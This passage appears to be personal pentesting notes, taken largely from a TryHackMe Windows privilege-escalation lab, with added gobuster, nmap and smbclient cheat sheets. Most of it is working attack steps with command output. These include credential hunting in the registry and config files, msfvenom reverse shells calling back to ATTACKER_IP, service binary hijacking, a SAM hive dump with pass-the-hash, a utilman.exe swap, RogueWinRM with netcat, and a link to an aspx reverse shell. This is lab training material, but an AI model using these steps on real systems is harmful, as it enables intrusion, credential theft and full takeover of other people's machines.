	Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network.
tasklist /svc | findstr /i windowsscheduler
Network Service
	Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to authenticate through the network.

These accounts are created and managed by Windows, and you won't be able to use them as other regular accounts. Still, in some situations, you may gain their privileges due to exploiting specific services.


Unattended Windows Installations

When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:

    C:\Unattend.xml
    C:\Windows\Panther\Unattend.xml
    C:\Windows\Panther\Unattend\Unattend.xml
    C:\Windows\system32\sysprep.inf
    C:\Windows\system32\sysprep\sysprep.xml

As part of these files, you might encounter credentials:

<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>

#Cleartext passwords 
# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# SNMP Parameters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

Powershell History

Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands. This is useful for repeating commands you have used before quickly. If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved by using the following command from a cmd.exe prompt:

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

Note: The command above will only work from cmd.exe, as Powershell won't recognize %userprofile% as an environment variable. To read the file from Powershell, you'd have to replace %userprofile% with $Env:userprofile. 


Saved Windows Credentials

Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:

cmdkey /list

While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the runas command and the /savecred option, as seen below.

runas /savecred /user:admin cmd.exe


IIS Configuration

Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called web.config and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:

    C:\inetpub\wwwroot\web.config
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

Here is a quick way to find database connection strings on the file:

type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString

#Another way 
Get-ChildItem -Path V:\Myfolder -Filter CopyForbuild.bat -Recurse -ErrorAction SilentlyContinue -Force


Retrieve Credentials from Software: PuTTY

PuTTY is an SSH client commonly found on Windows systems. Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.

To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:

reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

Note: Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.

Just as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.

How to know if it has bitlocker enabled
#bitlocker 

get-bitlockervolume
manage-bde -status



        

Go to taskusr1 desktop to retrieve a flag. Don't forget to input the flag at the end of this task.


AlwaysInstallElevated

Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.

Note: The AlwaysInstallElevated method won't work on this room's machine and it's included as information only.

This method requires two registry values to be set. You can query these from the command line using the commands below.
Command Prompt

C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

        

To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can generate a malicious .msi file using msfvenom, as seen below:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.87.69 LPORT=LOCAL_PORT -f msi -o malicious.msi

As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:
Command Prompt

C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi

-=-=-=-
Abusing Service Misconfigurations
Windows services are managed by the Service Control Manager (SCM). The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services.

Each service on a Windows machine will have an associated executable which will be run by the SCM whenever a service is started. It is important to note that service executables implement special functions to be able to communicate with the SCM, and therefore not any executable can be started as a service successfully. Each service also specifies the user account under which the service will run.

To better understand the structure of a service, let's check the apphostsvc service configuration with the sc qc command:

Command Prompt

C:\> sc qc apphostsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: apphostsvc
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Application Host Helper Service
        DEPENDENCIES       :
        SERVICE_START_NAME : localSystem

        

Here we can see that the associated executable is specified through the BINARY_PATH_NAME parameter, and the account used to run the service is shown on the SERVICE_START_NAME parameter.

Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. The DACL can be seen from Process Hacker (available on your machine's desktop):

Service DACL

All of the services configurations are stored on the registry under HKLM\SYSTEM\CurrentControlSet\Services\:

Service registry entries

A subkey exists for every service in the system. Again, we can see the associated executable on the ImagePath value and the account used to start the service on the ObjectName value. If a DACL has been configured for the service, it will be stored in a subkey called Security. As you have guessed by now, only administrators can modify such registry entries by default.


Insecure Permissions on Service Executable

If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.

To understand how this works, let's look at a vulnerability found on Splinterware System Scheduler. To start, we will query the service configuration using sc:
Command Prompt

C:\> sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcuser1

        

We can see that the service installed by the vulnerable software runs as svcuser1 and the executable associated with the service is in C:\Progra~2\System~1\WService.exe. We then proceed to check the permissions on the executable:
Command Prompt

C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files

        

And here we have something interesting. The Everyone group has modify permissions (M) on the service's executable. This means we can simply overwrite it with any payload of our preference, and the service will execute it with the privileges of the configured user account.

Let's generate an exe-service payload using msfvenom and serve it through a python webserver:
Kali Linux

user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe

user@attackerpc$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

        

We can then pull the payload from Powershell with the following command:
Powershell

wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe

        

Once the payload is in the Windows server, we proceed to replace the service executable with our payload. Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group as well:
Command Prompt

C:\> cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
        Successfully processed 1 files.

        

We start a reverse listener on our attacker machine:
Kali Linux

user@attackerpc$ nc -lvp 4445

        

And finally, restart the service. While in a normal scenario, you would likely have to wait for a service restart, you have been assigned privileges to restart the service yourself to save you some time. Use the following commands from a cmd.exe command prompt:
Command Prompt

C:\> sc stop windowsscheduler
C:\> sc start windowsscheduler

        

Note: PowerShell has sc as an alias to Set-Content, therefore you need to use sc.exe in order to control services with PowerShell this way.

As a result, you'll get a reverse shell with svcusr1 privileges:
Kali Linux

user@attackerpc$ nc -lvp 4445
Listening on 0.0.0.0 4445
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\svcusr1

        

Go to svcusr1 desktop to retrieve a flag. Don't forget to input the flag at the end of this task.


Unquoted Service Paths

When we can't directly write into service executables as before, there might still be a chance to force a service into running arbitrary executables by using a rather obscure feature.

When working with Windows services, a very particular behaviour occurs when the service is configured to point to an "unquoted" executable. By unquoted, we mean that the path of the associated executable isn't properly quoted to account for spaces on the command.

As an example, let's look at the difference between two services (these services are used as examples only and might not be available in your machine). The first service will use a proper quotation so that the SCM knows without a doubt that it has to execute the binary file pointed by "C:\Program Files\RealVNC\VNC Server\vncserver.exe", followed by the given parameters:
Command Prompt

C:\> sc qc "vncserver"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vncserver
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : VNC Server
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

        

Remember: PowerShell has 'sc' as an alias to 'Set-Content', therefore you need to use 'sc.exe' to control services if you are in a PowerShell prompt.
Now let's look at another service without proper quotation:
Command Prompt

C:\> sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2

        

When the SCM tries to execute the associated binary, a problem arises. Since there are spaces on the name of the "Disk Sorter Enterprise" folder, the command becomes ambiguous, and the SCM doesn't know which of the following you are trying to execute:
Command	Argument 1	Argument 2
C:\MyPrograms\Disk.exe	Sorter	Enterprise\bin\disksrs.exe
C:\MyPrograms\Disk Sorter.exe	Enterprise\bin\disksrs.exe	
C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe		


This has to do with how the command prompt parses a command. Usually, when you send a command, spaces are used as argument separators unless they are part of a quoted string. This means the "right" interpretation of the unquoted command would be to execute C:\\MyPrograms\\Disk.exe and take the rest as arguments.

Instead of failing as it probably should, SCM tries to help the user and starts searching for each of the binaries in the order shown in the table:

    First, search for C:\\MyPrograms\\Disk.exe. If it exists, the service will run this executable.
    If the latter doesn't exist, it will then search for C:\\MyPrograms\\Disk Sorter.exe. If it exists, the service will run this executable.
    If the latter doesn't exist, it will then search for C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe. This option is expected to succeed and will typically be run in a default installation.

From this behaviour, the problem becomes evident. If an attacker creates any of the executables that are searched for before the expected service executable, they can force the service to run an arbitrary executable.

While this sounds trivial, most of the service executables will be installed under C:\Program Files or C:\Program Files (x86) by default, which isn't writable by unprivileged users. This prevents any vulnerable service from being exploited. There are exceptions to this rule: - Some installers change the permissions on the installed folders, making the services vulnerable. - An administrator might decide to install the service binaries in a non-default path. If such a path is world-writable, the vulnerability can be exploited.

In our case, the Administrator installed the Disk Sorter binaries under c:\MyPrograms. By default, this inherits the permissions of the C:\ directory, which allows any user to create files and folders in it. We can check this using icacls:
Command Prompt

C:\>icacls c:\MyPrograms
c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              BUILTIN\Users:(I)(CI)(AD)
              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files

        

The BUILTIN\\Users group has AD and WD privileges, allowing the user to create subdirectories and files, respectively.

The process of creating an exe-service payload with msfvenom and transferring it to the target host is the same as before, so feel free to create the following payload and upload it to the server as before. We will also start a listener to receive the reverse shell when it gets executed:
Kali Linux

user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe

user@attackerpc$ nc -lvp 4446

        

Once the payload is in the server, move it to any of the locations where hijacking might occur. In this case, we will be moving our payload to C:\MyPrograms\Disk.exe. We will also grant Everyone full permissions on the file to make sure it can be executed by the service:
Command Prompt

C:\> move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe

C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
        Successfully processed 1 files.

        

Once the service gets restarted, your payload should execute:
Command Prompt

C:\> sc stop "disk sorter enterprise"
C:\> sc start "disk sorter enterprise"

        

As a result, you'll get a reverse shell with svcusr2 privileges:
Kali Linux

user@attackerpc$ nc -lvp 4446
Listening on 0.0.0.0 4446
Connection received on 10.10.175.90 50650
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\svcusr2

        

Go to svcusr2 desktop to retrieve a flag. Don't forget to input the flag at the end of this task.


Insecure Service Permissions

You might still have a slight chance of taking advantage of a service if the service's executable DACL is well configured, and the service's binary path is rightly quoted. Should the service DACL (not the service's executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service. This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.

To check for a service DACL from the command line, you can use Accesschk from the Sysinternals suite. For your convenience, a copy is available at C:\\tools. The command to check for the thmservice service DACL is:
Command Prompt

C:\tools\AccessChk> accesschk64.exe -qlc thmservice
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS

        

Here we can see that the BUILTIN\\Users group has the SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service.

Before changing the service, let's build another exe-service reverse shell and start a listener for it on the attacker's machine:
Kali Linux

user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe

user@attackerpc$ nc -lvp 4447

        

We will then transfer the reverse shell executable to the target machine and store it in C:\Users\thm-unpriv\rev-svc3.exe. Feel free to use wget to transfer your executable and move it to the desired location. Remember to grant permissions to Everyone to execute your payload:
Command Prompt

C:\> icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F

        

To change the service's associated executable and account, we can use the following command (mind the spaces after the equal signs when using sc.exe):
Command Prompt

C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem

        

Notice we can use any account to run the service. We chose LocalSystem as it is the highest privileged account available. To trigger our payload, all that rests is restarting the service:
Command Prompt

C:\> sc stop THMService
C:\> sc start THMService

        

And we will receive a shell back in our attacker's machine with SYSTEM privileges:
Kali Linux

user@attackerpc$ nc -lvp 4447
Listening on 0.0.0.0 4447
Connection received on 10.10.175.90 50650
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
NT AUTHORITY\SYSTEM

-=-=-=
Abusing dangerous privileges
Windows Privileges

Privileges are rights that an account has to perform specific system-related tasks. These tasks can be as simple as the privilege to shut down the machine up to privileges to bypass some DACL-based access controls.

Each user has a set of assigned privileges that can be checked with the following command:

whoami /priv

A complete list of available privileges on Windows systems is available here. From an attacker's standpoint, only those privileges that allow us to escalate in the system are of interest. You can find a comprehensive list of exploitable privileges on the Priv2Admin Github project.

While we won't take a look at each of them, we will showcase how to abuse some of the most common privileges you can find.


SeBackup / SeRestore

The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.

Having this power, an attacker can trivially escalate privileges on the system by using many techniques. The one we will look at consists of copying the SAM and SYSTEM registry hives to extract the local Administrator's password hash.

Log in to the target machine via RDP using the following credentials:

User: THMBackup

Password: CopyMaster555

This account is part of the "Backup Operators" group, which by default is granted the SeBackup and SeRestore privileges. We will need to open a command prompt using the "Open as administrator" option to use these privileges. We will be asked to input our password again to get an elevated console:

Run as admin

Once on the command prompt, we can check our privileges with the following command:
Command Prompt

C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

        

To backup the SAM and SYSTEM hashes, we can use the following commands:
Command Prompt

C:\> reg save hklm\system C:\Users\THMBackup\system.hive
The operation completed successfully.

C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
The operation completed successfully.

        

This will create a couple of files with the registry hives content. We can now copy these files to our attacker machine using SMB or any other available method. For SMB, we can use impacket's smbserver.py to start a simple SMB server with a network share in the current directory of our AttackBox:
Kali Linux

user@attackerpc$ mkdir share
user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
        

This will create a share named public pointing to the share directory, which requires the username and password of our current windows session. After this, we can use the copy command in our windows machine to transfer both files to our AttackBox: 
Command Prompt

C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\

        

And use impacket to retrieve the users' password hashes:
Kali Linux

user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


        

We can finally use the Administrator's hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges:
Kali Linux

user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.199.94
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.175.90.....
[*] Found writable share ADMIN$
[*] Uploading file nfhtabqO.exe
[*] Opening SVCManager on 10.10.175.90.....
[*] Creating service RoLE on 10.10.175.90.....
[*] Starting service RoLE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
        


SeTakeOwnership

The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges, as we could, for example, search for a service running as SYSTEM and take ownership of the service's executable. For this task, we will be taking a different route, however.

Log in to the target machine via RDP using the following credentials:

User: THMTakeOwnership

Password: TheWorldIsMine2022

To get the SeTakeOwnership privilege, we need to open a command prompt using the "Open as administrator" option. We will be asked to input our password to get an elevated console:

Run as admin

Once on the command prompt, we can check our privileges with the following command:
Command Prompt

C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled

        

We'll abuse utilman.exe to escalate privileges this time. Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:

utilman normal behaviour

Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. As we can take ownership of any file, replacing it is trivial.

To replace utilman, we will start by taking ownership of it with the following command:
Command Prompt

C:\> takeown /f C:\Windows\System32\Utilman.exe

SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WINPRIVESC2\thmtakeownership".

        

Notice that being the owner of a file doesn't necessarily mean that you have privileges over it, but being the owner you can assign yourself any privileges you need. To give your user full permissions over utilman.exe you can use the following command:
Command Prompt

C:\> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
processed file: Utilman.exe
Successfully processed 1 files; Failed processing 0 files

        

After this, we will replace utilman.exe with a copy of cmd.exe:
Command Prompt

C:\Windows\System32\> copy cmd.exe utilman.exe
        1 file(s) copied.

        

To trigger utilman, we will lock our screen from the start button:

lock screen

And finally, proceed to click on the "Ease of Access" button, which runs utilman.exe with SYSTEM privileges. Since we replaced it with a cmd.exe copy, we will get a command prompt with SYSTEM privileges:

utilman shell


SeImpersonate / SeAssignPrimaryToken

These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.

Impersonation is easily understood when you think about how an FTP server works. The FTP server must restrict users to only access the files they should be allowed to see.

Let's assume we have an FTP service running with user ftp. Without impersonation, if user Ann logs into the FTP server and tries to access her files, the FTP service would try to access them with its access token rather than Ann's:

FTP server without impersonation

There are several reasons why using ftp's token is not the best idea: - For the files to be served correctly, they would need to be accessible to the ftp user. In the example above, the FTP service would be able to access Ann's files, but not Bill's files, as the DACL in Bill's files doesn't allow user ftp. This adds complexity as we must manually configure specific permissions for each served file/directory. - For the operating system, all files are accessed by user ftp, independent of which user is currently logged in to the FTP service. This makes it impossible to delegate the authorisation to the operating system; therefore, the FTP service must implement it. - If the FTP service were compromised at some point, the attacker would immediately gain access to all of the folders to which the ftp user has access.

If, on the other hand, the FTP service's user has the SeImpersonate or SeAssignPrimaryToken privilege, all of this is simplified a bit, as the FTP service can temporarily grab the access token of the user logging in and use it to perform any task on their behalf:

FTP server with impersonation

Now, if user Ann logs in to the FTP service and given that the ftp user has impersonation privileges, it can borrow Ann's access token and use it to access her files. This way, the files don't need to provide access to user ftp in any way, and the operating system handles authorisation. Since the FTP service is impersonating Ann, it won't be able to access Jude's or Bill's files during that session.

As attackers, if we manage to take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any user connecting and authenticating to that process.

In Windows systems, you will find that the LOCAL SERVICE and NETWORK SERVICE ACCOUNTS already have such privileges. Since these accounts are used to spawn services using restricted accounts, it makes sense to allow them to impersonate connecting users if the service needs. Internet Information Services (IIS) will also create a similar default account called "iis apppool\defaultapppool" for web applications.

To elevate privileges using such accounts, an attacker needs the following: 1. To spawn a process so that users can connect and authenticate to it for impersonation to occur. 2. Find a way to force privileged users to connect and authenticate to the spawned malicious process.

We will use RogueWinRM exploit to accomplish both conditions.

Let's start by assuming we have already compromised a website running on IIS and that we have planted a web shell on the following address:

http://10.10.199.94/

We can use the web shell to check for the assigned privileges of the compromised account and confirm we hold both privileges of interest for this task:

Webshell impersonate privileges

To use RogueWinRM, we first need to upload the exploit to the target machine. For your convenience, this has already been done, and you can find the exploit in the C:\tools\ folder.

The RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service, which is simply a port that exposes a Powershell console to be used remotely through the network. Think of it like SSH, but using Powershell.

If, for some reason, the WinRM service isn't running on the victim server, an attacker can start a fake WinRM service on port 5985 and catch the authentication attempt made by the BITS service when starting. If the attacker has SeImpersonate privileges, he can execute any command on behalf of the connecting user, which is SYSTEM.

Before running the exploit, we'll start a netcat listener to receive a reverse shell on our attacker's machine:
Kali Linux

user@attackerpc$ nc -lvp 4442

        

And then, use our web shell to trigger the RogueWinRM exploit using the following command:

c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"

RogueWinRM exploit execution

Note: The exploit may take up to 2 minutes to work, so your browser may appear as unresponsive for a bit. This happens if you run the exploit multiple times as it must wait for the BITS service to stop before starting it again. The BITS service will stop automatically after 2 minutes of starting.

The -p parameter specifies the executable to be run by the exploit, which is nc64.exe in this case. The -a parameter is used to pass arguments to the executable. Since we want nc64 to establish a reverse shell against our attacker machine, the arguments to pass to netcat will be -e cmd.exe ATTACKER_IP 4442.

If all was correctly set up, you should expect a shell with SYSTEM privileges:
Kali Linux

user@attackerpc$ nc -lvp 4442
Listening on 0.0.0.0 4442
Connection received on 10.10.175.90 49755
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
nt authority\system

        

Using any of the three methods discussed in this task, gain access to the Administrator's desktop and collect the flag. Don't forget to input the flag at the end of this task.

-=-=-
automated tools 
WinPEAS

WinPEAS is a script developed to enumerate the target system to uncover privilege escalation paths. You can find more information about winPEAS and download either the precompiled executable or a .bat script. WinPEAS will run commands similar to the ones listed in the previous task and print their output. The output from winPEAS can be lengthy and sometimes difficult to read. This is why it would be good practice to always redirect the output to a file, as shown below:
Command Prompt

           
C:\> winpeas.exe > outputfile.txt

        

WinPEAS can be downloaded here.


PrivescCheck

PrivescCheck is a PowerShell script that searches common privilege escalation on the target system. It provides an alternative to WinPEAS without requiring the execution of a binary file.

PrivescCheck can be downloaded here.

Reminder: To run PrivescCheck on the target system, you may need to bypass the execution policy restrictions. To achieve this, you can use the Set-ExecutionPolicy cmdlet as shown below.
Powershell

           
PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\> . .\PrivescCheck.ps1
PS C:\> Invoke-PrivescCheck

        


WES-NG: Windows Exploit Suggester - Next Generation

Some exploit suggesting scripts (e.g. winPEAS) will require you to upload them to the target system and run them there. This may cause antivirus software to detect and delete them. To avoid making unnecessary noise that can attract attention, you may prefer to use WES-NG, which will run on your attacking machine (e.g. Kali or TryHackMe AttackBox).

WES-NG is a Python script that can be found and downloaded here.

Once installed, and before using it, type the wes.py --update command to update the database. The script will refer to the database it creates to check for missing patches that can result in a vulnerability you can use to elevate your privileges on the target system.

To use the script, you will need to run the systeminfo command on the target system. Do not forget to direct the output to a .txt file you will need to move to your attacking machine.

Once this is done, wes.py can be run as follows;
Kali Linux

user@kali$ wes.py systeminfo.txt


Metasploit

If you already have a Meterpreter shell on the target system, you can use the multi/recon/local_exploit_suggester module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.


-=-=-=-=-=

gobuster dir -u http://<ip>:3333 -w <word list location>
GoBuster flag	Description
-e	Print the full URLs in your console
-u	The target URL
-w	Path to your wordlist
-U and -P	Username and Password for Basic Auth
-p <x>	Proxy to use for requests
-c <http cookies>	Specify a cookie for simulating your auth


-=-=-=-=-=
Samba Scan
Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often referred to as a network file system.

Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <ip>
nmap --script=smb-enum* >ip-addr< -oN smb_enum.nmap
#Other version being --scripts_file a file created by me
❯ nmap --script-args-file=scripts_file 10.10.175.107 -oN final
Vulnerable scan
nmap --script vuln -p 22,80,139,445,8009,8080 <ip>

-=-=-=-=-==
smbclient 
Send a message to the machine name pc04
  net send pc04 hi there
  smbclient -M

-=-=-=


List shares
  smbclient -L //bigserve -U usermark
  and the system would prompt me for a password. Alternatively, I could type
  smbclient -L //Bigserve -U Usermark%swordfish

##Ir a la ruta del recurso compartido y tirar de un aspx-reverse-shell 
  https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx
psexec.py user:'password'@10.10.32.51

Lcd specifies the default directory on your workstation—the directory in which smbclient looks for the files you want to send and puts the files you've received. Cd specifies the default directory for the server. So, if you're connected to a share that contains a directory named mail, from which you want to copy some files to a directory named /mymailfiles on your local Linux box, you can set those directories as the default directories by typing

  cd mail
  lcd /mymailfiles

